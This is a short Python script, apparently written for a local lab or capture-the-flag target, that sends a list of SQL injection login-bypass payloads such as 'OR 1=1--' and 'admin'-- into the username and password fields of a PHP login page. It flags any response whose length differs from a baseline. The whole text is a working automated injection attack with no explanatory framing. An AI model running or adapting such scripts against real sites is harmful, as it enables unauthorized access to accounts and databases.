import requests

url = "http://127.0.0.1:32907/index.php"
payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--", "admin' #", 
            "' OR '1'='1'--", "') OR ('1'='1", "' OR 'x'='x", 
            '") OR ("1"="1', "' UNION SELECT NULL--"]

r0 = requests.post(url, data={'username': 'a', 'password': 'b'})
baseline = len(r0.content)

for p in payloads:
    r = requests.post(url, data={'username': p, 'password': 'x'})
    if len(r.content) != baseline:
        print(f"USER {p}: {r.status_code} {len(r.content)}B")
        print(r.text[:200])

for p in payloads:
    r = requests.post(url, data={'username': 'admin', 'password': p})
    if len(r.content) != baseline:
        print(f"PASS {p}: {r.status_code} {len(r.content)}B")
        print(r.text[:200])

print("Done")

